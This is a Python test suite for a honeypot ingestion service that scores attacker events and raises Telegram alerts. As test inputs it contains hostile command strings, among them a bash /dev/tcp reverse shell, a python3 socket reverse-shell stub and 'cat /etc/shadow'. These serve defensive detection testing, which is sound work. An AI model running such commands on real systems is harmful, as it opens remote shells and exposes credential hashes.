from __future__ import annotations

import math
from datetime import datetime, timedelta, timezone
from uuid import uuid4
from zoneinfo import ZoneInfo

import pytest
from fastapi import BackgroundTasks
from sqlalchemy import select

from app.models.alert import Alert
from app.models.event import Event
from app.models.profile import Profile
from app.schemas.event import EventIn
from app.services.ingest import (
    ALERT_COOLDOWN_MINUTES,
    TAU_SECONDS,
    ingest_event,
)
from tests.integration.conftest import BAIT_FILE_PATH


MSK = ZoneInfo("Europe/Moscow")


def _make_event(
    *,
    action: str = "login_success",
    obj: str | None = None,
    src_ip: str = "10.0.0.99",
    trap_id: str = "sensor_a",
    ts: datetime | None = None,
) -> EventIn:
    return EventIn(
        event_id=uuid4(),
        ts=ts or datetime.now(timezone.utc),
        source="cowrie",
        src_ip=src_ip,
        action=action,
        object=obj,
        trap_id=trap_id,
        user="root",
        host="sensor_a",
        raw={"test": True},
    )


@pytest.fixture
def bt() -> BackgroundTasks:
    return BackgroundTasks()


def _scheduled_telegram_texts(bt: BackgroundTasks) -> list[str]:
    from app.integrations.telegram import telegram_send

    return [
        task.args[0] for task in bt.tasks if task.func is telegram_send
    ]


class TestEventPersistence:
    def test_event_row_created(self, db_session, ruleset, bt):
        event = _make_event(action="login_failed")
        ingest_event(event, bt, db_session, ruleset)

        rows = db_session.execute(select(Event)).scalars().all()
        assert len(rows) == 1
        assert rows[0].action == "login_failed"
        assert rows[0].src_ip == "10.0.0.99"
        assert rows[0].source == "cowrie"

    def test_event_id_preserved(self, db_session, ruleset, bt):
        event = _make_event()
        ingest_event(event, bt, db_session, ruleset)

        row = db_session.execute(select(Event)).scalar_one()
        assert row.id == event.event_id

    def test_raw_stored_as_dict(self, db_session, ruleset, bt):
        event = _make_event()
        ingest_event(event, bt, db_session, ruleset)

        row = db_session.execute(select(Event)).scalar_one()
        assert isinstance(row.raw, dict)
        assert "rule_eval" in row.raw
        assert "delta" in row.raw["rule_eval"]
        assert "matched_rules" in row.raw["rule_eval"]


class TestProfileAccumulation:
    def test_profile_created_on_first_event(self, db_session, ruleset, bt):
        event = _make_event(action="login_failed")
        ingest_event(event, bt, db_session, ruleset)

        profile = db_session.get(Profile, ("sensor_a", "10.0.0.99"))
        assert profile is not None
        assert profile.risk_score > 0.0

    def test_profile_accumulates_across_events(self, db_session, ruleset, bt):
        ts = datetime.now(timezone.utc)
        for _ in range(3):
            ingest_event(
                _make_event(action="login_failed", ts=ts), bt, db_session, ruleset
            )

        profile = db_session.get(Profile, ("sensor_a", "10.0.0.99"))
        assert profile.risk_score >= 3.0

    def test_separate_profiles_for_different_src_ip(self, db_session, ruleset, bt):
        ingest_event(_make_event(src_ip="10.0.0.1"), bt, db_session, ruleset)
        ingest_event(_make_event(src_ip="10.0.0.2"), bt, db_session, ruleset)

        p1 = db_session.get(Profile, ("sensor_a", "10.0.0.1"))
        p2 = db_session.get(Profile, ("sensor_a", "10.0.0.2"))

        assert p1 is not None
        assert p2 is not None

    def test_separate_profiles_for_different_trap_id(self, db_session, ruleset, bt):
        ingest_event(_make_event(trap_id="sensor_a"), bt, db_session, ruleset)
        ingest_event(_make_event(trap_id="sensor_b"), bt, db_session, ruleset)

        rows = db_session.execute(select(Profile)).scalars().all()
        assert len(rows) == 2


class TestRiskDecay:
    def test_decay_matches_exp_formula(self, db_session, ruleset, bt):
        t0 = datetime(2026, 4, 28, 9, 30, 0, tzinfo=MSK)
        dt_seconds = 7 * 3600
        t1 = t0 + timedelta(seconds=dt_seconds)
        weight_login_failed = 1.0

        ingest_event(
            _make_event(action="login_failed", ts=t0), bt, db_session, ruleset
        )
        score_before = db_session.get(
            Profile, ("sensor_a", "10.0.0.99")
        ).risk_score
        assert score_before == pytest.approx(weight_login_failed)

        ingest_event(
            _make_event(action="login_failed", ts=t1), bt, db_session, ruleset
        )
        score_after = db_session.get(
            Profile, ("sensor_a", "10.0.0.99")
        ).risk_score

        expected = (
            weight_login_failed * math.exp(-dt_seconds / TAU_SECONDS)
            + weight_login_failed
        )
        assert score_after == pytest.approx(expected, rel=1e-6)

    def test_no_decay_for_close_events(self, db_session, ruleset, bt):
        t0 = datetime(2026, 4, 28, 12, 0, 0, tzinfo=MSK)
        t1 = t0 + timedelta(seconds=1)

        ingest_event(_make_event(action="login_failed", ts=t0), bt, db_session, ruleset)
        ingest_event(_make_event(action="login_failed", ts=t1), bt, db_session, ruleset)

        profile = db_session.get(Profile, ("sensor_a", "10.0.0.99"))
        assert profile.risk_score == pytest.approx(2.0, abs=0.001)

    def test_clock_skew_does_not_amplify_score(self, db_session, ruleset, bt):
        t1 = datetime(2026, 4, 28, 12, 0, 0, tzinfo=MSK)
        t0_in_past = t1 - timedelta(hours=1)

        ingest_event(
            _make_event(action="login_failed", ts=t1), bt, db_session, ruleset
        )
        ingest_event(
            _make_event(action="login_failed", ts=t0_in_past),
            bt,
            db_session,
            ruleset,
        )

        profile = db_session.get(Profile, ("sensor_a", "10.0.0.99"))
        assert profile.risk_score == pytest.approx(2.0, abs=0.001)


class TestOffHoursMultiplier:
    def test_login_at_night_amplified(self, db_session, ruleset, bt):
        ts_day = datetime(2026, 4, 28, 12, 0, 0, tzinfo=MSK)
        ts_night = datetime(2026, 4, 28, 23, 0, 0, tzinfo=MSK)
        assert ts_day.weekday() < 5, "тест требует рабочего дня"
        assert ts_night.weekday() < 5

        ingest_event(
            _make_event(action="login_success", src_ip="10.0.0.1", ts=ts_day),
            bt,
            db_session,
            ruleset,
        )
        ingest_event(
            _make_event(action="login_success", src_ip="10.0.0.2", ts=ts_night),
            bt,
            db_session,
            ruleset,
        )

        p_day = db_session.get(Profile, ("sensor_a", "10.0.0.1"))
        p_night = db_session.get(Profile, ("sensor_a", "10.0.0.2"))

        assert p_night.risk_score > p_day.risk_score
        assert p_night.risk_score == pytest.approx(
            p_day.risk_score * ruleset.off_hours_multiplier
        )


class TestAlertCreation:
    def test_no_alert_when_below_threshold(self, db_session, ruleset, bt):
        ingest_event(_make_event(action="login_failed"), bt, db_session, ruleset)

        alerts = db_session.execute(select(Alert)).scalars().all()
        assert alerts == []

    def test_alert_created_when_threshold_exceeded(self, db_session, ruleset, bt):
        event = _make_event(action="file_download", obj=BAIT_FILE_PATH)
        ingest_event(event, bt, db_session, ruleset)

        alerts = db_session.execute(select(Alert)).scalars().all()
        assert len(alerts) == 1
        alert = alerts[0]
        assert alert.severity == "medium"
        assert alert.risk_score == pytest.approx(10.0)
        assert alert.status == "open"
        assert alert.count == 1

    def test_new_alert_has_threshold_exceeded_note(
        self, db_session, ruleset, bt
    ):
        ingest_event(
            _make_event(action="file_download", obj=BAIT_FILE_PATH),
            bt,
            db_session,
            ruleset,
        )

        alert = db_session.execute(select(Alert)).scalar_one()
        assert alert.details.get("note") == "threshold exceeded"

    def test_alert_severity_matches_risk_score(self, db_session, ruleset, bt):
        for i in range(3):
            ingest_event(
                _make_event(
                    action="command_exec",
                    obj="bash -i >& /dev/tcp/x/4444",
                    ts=datetime.now(timezone.utc) + timedelta(seconds=i),
                ),
                bt,
                db_session,
                ruleset,
            )

        alerts = db_session.execute(select(Alert)).scalars().all()
        assert len(alerts) >= 1
        assert any(a.severity in {"high", "critical"} for a in alerts)

    def test_alert_details_payload_present(self, db_session, ruleset, bt):
        event = _make_event(action="file_download", obj=BAIT_FILE_PATH)
        ingest_event(event, bt, db_session, ruleset)

        alert = db_session.execute(select(Alert)).scalar_one()
        details = alert.details
        assert "risk_before" in details
        assert "risk_after" in details
        assert "delta" in details
        assert "matched_rules" in details
        assert "event" in details
        assert "recent_events" in details


class TestSingleEventScenarios:
    def test_single_reverse_shell_creates_alert(
        self, db_session, ruleset, bt
    ):
        ingest_event(
            _make_event(
                action="command_exec",
                obj="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            ),
            bt,
            db_session,
            ruleset,
        )

        alerts = db_session.execute(select(Alert)).scalars().all()
        assert len(alerts) == 1
        assert alerts[0].risk_score >= ruleset.alert_threshold

    def test_single_python3_reverse_shell_creates_alert(
        self, db_session, ruleset, bt
    ):
        ingest_event(
            _make_event(
                action="command_exec",
                obj="python3 -c 'import socket,os,pty;s=socket.socket()'",
            ),
            bt,
            db_session,
            ruleset,
        )

        alerts = db_session.execute(select(Alert)).scalars().all()
        assert len(alerts) == 1


class TestAlertDeduplication:
    def test_same_severity_dedup_increments_counter(self, db_session, ruleset, bt):
        now = datetime.now(timezone.utc)

        for i in range(5):
            ingest_event(
                _make_event(
                    action="file_download",
                    obj=BAIT_FILE_PATH,
                    ts=now + timedelta(seconds=i),
                ),
                bt,
                db_session,
                ruleset,
            )

        alerts = db_session.execute(select(Alert)).scalars().all()
        critical_alerts = [a for a in alerts if a.severity == "critical"]

        assert len(critical_alerts) == 1
        assert critical_alerts[0].count >= 2

    def test_different_severity_creates_new_alert(self, db_session, ruleset, bt):
        now = datetime.now(timezone.utc)

        ingest_event(
            _make_event(
                action="file_download",
                obj=BAIT_FILE_PATH,
                ts=now,
            ),
            bt,
            db_session,
            ruleset,
        )
        for i in range(1, 5):
            ingest_event(
                _make_event(
                    action="command_exec",
                    obj="cat /etc/shadow",
                    ts=now + timedelta(seconds=i),
                ),
                bt,
                db_session,
                ruleset,
            )

        alerts = db_session.execute(select(Alert)).scalars().all()
        severities = {a.severity for a in alerts}
        assert len(severities) >= 2

    def test_dedup_alert_has_deduplicated_note(self, db_session, ruleset, bt):
        now = datetime.now(timezone.utc)

        for i in range(5):
            ingest_event(
                _make_event(
                    action="file_download",
                    obj=BAIT_FILE_PATH,
                    ts=now + timedelta(seconds=i),
                ),
                bt,
                db_session,
                ruleset,
            )

        critical_alert = db_session.execute(
            select(Alert).where(Alert.severity == "critical")
        ).scalar_one()
        assert critical_alert.count >= 2
        assert "deduplicated" in critical_alert.details.get("note", "")

    def test_dedup_overwrites_details_with_latest_event(
        self, db_session, ruleset, bt
    ):
        now = datetime.now(timezone.utc)
        objects = [
            "/srv/ftp/bait/salary_report_2025.txt",
            "/srv/ftp/bait/salary_report_2025.txt",
            "/srv/ftp/bait/salary_report_2025.txt",
            "/srv/ftp/bait/vpn_passwords.txt",
        ]
        for i, obj in enumerate(objects):
            ingest_event(
                _make_event(
                    action="file_download",
                    obj=obj,
                    ts=now + timedelta(seconds=i),
                ),
                bt,
                db_session,
                ruleset,
            )

        critical_alert = db_session.execute(
            select(Alert).where(Alert.severity == "critical")
        ).scalar_one()
        assert critical_alert.count >= 2
        assert (
            critical_alert.details["event"]["object"]
            == "/srv/ftp/bait/vpn_passwords.txt"
        )

    def test_alert_after_cooldown_creates_separate_alert(
        self, db_session, ruleset, bt
    ):
        now = datetime.now(timezone.utc)
        ingest_event(
            _make_event(
                action="file_download",
                obj=BAIT_FILE_PATH,
                ts=now,
            ),
            bt,
            db_session,
            ruleset,
        )

        beyond_cooldown = now + timedelta(
            minutes=ALERT_COOLDOWN_MINUTES + 1
        )
        ingest_event(
            _make_event(
                action="file_download",
                obj=BAIT_FILE_PATH,
                ts=beyond_cooldown,
            ),
            bt,
            db_session,
            ruleset,
        )

        alerts = db_session.execute(select(Alert)).scalars().all()
        assert len(alerts) == 2
        assert all(a.count == 1 for a in alerts), (
            "ни один алерт не должен быть дедуплицирован — "
            f"counts: {[a.count for a in alerts]}"
        )

    def test_same_severity_after_cooldown_creates_new_alert(
        self, db_session, ruleset, bt, monkeypatch
    ):
        import time
        from app.services import ingest as ingest_module

        monkeypatch.setattr(ingest_module, "ALERT_COOLDOWN_MINUTES", 1 / 60)
        monkeypatch.setattr(ingest_module, "TAU_SECONDS", 0.1)

        ingest_event(
            _make_event(
                action="file_download",
                obj=BAIT_FILE_PATH,
                ts=datetime.now(timezone.utc),
            ),
            bt, db_session, ruleset,
        )
        time.sleep(2)
        ingest_event(
            _make_event(
                action="file_download",
                obj=BAIT_FILE_PATH,
                ts=datetime.now(timezone.utc),
            ),
            bt, db_session, ruleset,
        )

        alerts = db_session.execute(select(Alert)).scalars().all()
        assert len(alerts) == 2
        assert all(a.severity == "medium" for a in alerts)
        assert all(a.count == 1 for a in alerts)


class TestKillChainScenario:
    def test_progressive_attack_chain_triggers_alert(
        self, db_session, ruleset, bt
    ):
        ts = datetime(2026, 4, 28, 12, 0, 0, tzinfo=MSK)
        ip = "10.0.0.50"
        assert ts.weekday() < 5, "сценарий должен идти в рабочий день"
        assert (
            ruleset.work_start <= ts.strftime("%H:%M") < ruleset.work_end
        ), "сценарий идёт в рабочее время — без off-hours множителя"

        def at(seconds: int) -> datetime:
            return ts + timedelta(seconds=seconds)

        def fetch_profile() -> Profile:
            return db_session.get(Profile, ("sensor_a", ip))

        for i in range(3):
            ingest_event(
                _make_event(action="login_failed", src_ip=ip, ts=at(i)),
                bt, db_session, ruleset,
            )
        stage1 = fetch_profile().risk_score
        assert stage1 < ruleset.alert_threshold
        assert (
            db_session.execute(select(Alert)).scalars().all() == []
        ), "stage1 не должен порождать alert"

        ingest_event(
            _make_event(action="login_success", src_ip=ip, ts=at(10)),
            bt, db_session, ruleset,
        )
        for cmd, sec in [
            ("whoami", 11),
            ("uname -a", 12),
            ("ip a", 13),
            ("cat /etc/os-release", 14),
        ]:
            ingest_event(
                _make_event(
                    action="command_exec", obj=cmd, src_ip=ip, ts=at(sec)
                ),
                bt, db_session, ruleset,
            )
        stage2 = fetch_profile().risk_score
        assert stage2 > stage1, "разведка должна повысить риск-оценку"

        ingest_event(
            _make_event(
                action="command_exec",
                obj="cat /etc/shadow",
                src_ip=ip,
                ts=at(20),
            ),
            bt, db_session, ruleset,
        )

        alerts = (
            db_session.execute(
                select(Alert).where(Alert.src_ip == ip)
            )
            .scalars()
            .all()
        )
        assert len(alerts) >= 1
        assert any(
            a.severity in {"high", "critical"} for a in alerts
        ), f"ожидался high/critical, получили {[a.severity for a in alerts]}"

    def test_chain_does_not_alert_for_legitimate_admin_session(
        self, db_session, ruleset, bt
    ):
        ts = datetime(2026, 4, 28, 11, 0, 0, tzinfo=MSK)
        ip = "10.0.0.60"

        ingest_event(
            _make_event(action="login_success", src_ip=ip, ts=ts),
            bt, db_session, ruleset,
        )
        for sec, cmd in enumerate(["ls", "pwd", "df -h"], start=1):
            ingest_event(
                _make_event(
                    action="command_exec", obj=cmd, src_ip=ip,
                    ts=ts + timedelta(seconds=sec),
                ),
                bt, db_session, ruleset,
            )

        alerts = (
            db_session.execute(select(Alert).where(Alert.src_ip == ip))
            .scalars()
            .all()
        )
        assert alerts == [], (
            "легитимная админ-сессия не должна порождать alert; "
            f"зафиксировано: {[(a.severity, a.risk_score) for a in alerts]}"
        )


class TestAlertNotification:
    def test_no_notification_below_threshold(self, db_session, ruleset, bt):
        ingest_event(_make_event(action="login_failed"), bt, db_session, ruleset)
        assert _scheduled_telegram_texts(bt) == []

    def test_notification_scheduled_when_alert_created(
        self, db_session, ruleset, bt
    ):
        event = _make_event(action="file_download", obj=BAIT_FILE_PATH)
        ingest_event(event, bt, db_session, ruleset)

        texts = _scheduled_telegram_texts(bt)
        assert len(texts) == 1

    def test_notification_text_contract(self, db_session, ruleset, bt):
        event = _make_event(
            action="file_download",
            obj=BAIT_FILE_PATH,
            src_ip="10.7.7.7",
            trap_id="sensor_b",
        )
        ingest_event(event, bt, db_session, ruleset)

        text = _scheduled_telegram_texts(bt)[0]
        assert "Alert" in text
        assert "severity" in text
        assert "trap" in text and "sensor_b" in text
        assert "src_ip" in text and "10.7.7.7" in text
        assert "risk" in text
        assert "action" in text and "file_download" in text
        assert "salary_report_2025.txt" in text

    def test_notification_text_uses_html_format(self, db_session, ruleset, bt):
        ingest_event(
            _make_event(action="file_download", obj=BAIT_FILE_PATH),
            bt,
            db_session,
            ruleset,
        )

        text = _scheduled_telegram_texts(bt)[0]
        assert "<b>" in text and "</b>" in text

    def test_notification_includes_recent_events_block(
        self, db_session, ruleset, bt
    ):
        now = datetime.now(timezone.utc)
        ingest_event(
            _make_event(action="login_failed", ts=now),
            bt,
            db_session,
            ruleset,
        )
        ingest_event(
            _make_event(
                action="file_download",
                obj=BAIT_FILE_PATH,
                ts=now + timedelta(seconds=1),
            ),
            bt,
            db_session,
            ruleset,
        )

        text = _scheduled_telegram_texts(bt)[0]
        assert "recent events" in text
        assert "•" in text

    def test_no_telegram_for_pure_cooldown_dedup(
        self, db_session, ruleset, bt, monkeypatch
    ):
        import time
        from app.services import ingest as ingest_module

        monkeypatch.setattr(ingest_module, "TAU_SECONDS", 0.1)

        ingest_event(
            _make_event(
                action="file_download",
                obj=BAIT_FILE_PATH,
                ts=datetime.now(timezone.utc),
            ),
            bt, db_session, ruleset,
        )
        before = len(_scheduled_telegram_texts(bt))
        assert before == 1

        time.sleep(1)
        ingest_event(
            _make_event(
                action="file_download",
                obj=BAIT_FILE_PATH,
                ts=datetime.now(timezone.utc),
            ),
            bt, db_session, ruleset,
        )
        after = len(_scheduled_telegram_texts(bt))

        alerts = db_session.execute(select(Alert)).scalars().all()
        assert len(alerts) == 1
        assert alerts[0].count >= 2
        assert after == before

    def test_dedup_does_not_send_repeat_notification(
        self, db_session, ruleset, bt
    ):
        now = datetime.now(timezone.utc)

        for i in range(5):
            ingest_event(
                _make_event(
                    action="file_download",
                    obj=BAIT_FILE_PATH,
                    ts=now + timedelta(seconds=i),
                ),
                bt,
                db_session,
                ruleset,
            )

        scheduled = _scheduled_telegram_texts(bt)
        alerts = db_session.execute(select(Alert)).scalars().all()
        assert len(scheduled) == len(alerts)


class TestReturnValueShape:
    def test_response_contract(self, db_session, ruleset, bt):
        event = _make_event(action="login_failed")
        result = ingest_event(event, bt, db_session, ruleset)

        assert set(result.keys()) >= {
            "status",
            "event_id",
            "src_ip",
            "risk_score",
            "delta",
            "matched_rules",
        }
        assert result["status"] == "ok"
        assert result["src_ip"] == "10.0.0.99"
        assert isinstance(result["risk_score"], float)
        assert isinstance(result["matched_rules"], list)
